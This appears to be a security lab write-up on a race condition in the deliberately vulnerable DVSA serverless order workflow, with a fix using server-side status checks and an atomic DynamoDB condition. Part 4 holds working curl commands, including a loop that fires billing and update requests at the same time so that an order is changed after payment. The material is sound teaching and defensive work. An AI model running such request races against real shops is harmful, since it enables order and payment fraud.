# Lesson 8: Logic Vulnerability (Race Condition)

## Part 1: Goal and Vulnerability Summary
This lesson demonstrates a race condition vulnerability in the DVSA order workflow.

The issue allows an attacker to modify an order while the billing process is executing, which may lead to inconsistent or incorrect order states.

### Goal
- Order updates can occur during or after billing
- The system does not enforce correct workflow sequencing
- This leads to inconsistent payment and order data

---

## Part 2: Root Cause
The root cause is incomplete server-side workflow enforcement:

- No validation preventing updates after payment
- No synchronization between billing and update operations
- No atomic enforcement of order state in DynamoDB

The system relies on request timing instead of enforcing safe state transitions.

---

## Part 3: Environment and Setup
The DVSA application is deployed on AWS using:
- API Gateway
- Lambda
- DynamoDB

### Tools Used
- AWS CloudShell / terminal
- curl
- Browser DevTools
- jq

---

## Part 4: Reproduction Steps

### Step 1: Create Order

```bash
curl -s "$API" \
-H "content-type: application/json" \
-H "authorization: $TOKEN" \
--data-raw '{"action":"new","cart-id":"lesson8-cart","items":{"1017":1}}'

export ORDER_ID="<ORDER_ID>"
```

### Step 2: Add Shipping

```bash
curl -s "$API" \
-H "content-type: application/json" \
-H "authorization: $TOKEN" \
--data-raw '{"action":"shipping","order-id":"<ORDER_ID>","data":{"address":"123 Test","email":"test@test.com","name":"Test"}}'
```

### Step 3: Race Condition Attack

```bash
for i in {1..5}; do
  curl -s "$API" \
  -H "content-type: application/json" \
  -H "authorization: $TOKEN" \
  --data-raw '{"action":"billing","order-id":"<ORDER_ID>","data":{"ccn":"4242424242424242","exp":"11/30","cvv":"123"}}' &

  curl -s "$API" \
  -H "content-type: application/json" \
  -H "authorization: $TOKEN" \
  --data-raw '{"action":"update","order-id":"<ORDER_ID>","items":{"1017":99}}' &

  wait
done
```

---

## Part 5: Evidence

### Before Fix

```json
{"status":"err","msg":"order already made"}
{"status":"ok","msg":"cart updated"}
```

This shows:

- Billing completed
- Order was still modified after payment

---

## Part 6: Fix Strategy

### 1. Logical Validation

```python
if current_status >= 120:
    return {"status": "err", "msg": "order already paid"}
```

### 2. Atomic Protection (DynamoDB)

```python
ConditionExpression="orderStatus < :paid"
```

---

## Part 7: Code Changes

```python
response = table.update_item(
    Key=key,
    UpdateExpression="SET itemList = :itemList",
    ConditionExpression="orderStatus < :paid",
    ExpressionAttributeValues={
        ":itemList": itemList,
        ":paid": 120
    }
)
```

---

## Part 8: Verification After Fix

### After Fix

```json
{"status":"ok","amount":45}
{"status":"err","msg":"order already paid"}
```

✔ Billing works  
✔ Update is blocked  
✔ System is consistent  

---

## Part 9: Analysis

### Intended Flow

User → API → Lambda → Database → Response

### Rule

Paid orders must not be modified

### Deviation

Order was modified after payment

---

## Part 10: Takeaway

- Always validate workflow state on the server
- Use atomic database operations
- Never trust request timing
- Enforce strict state transitions
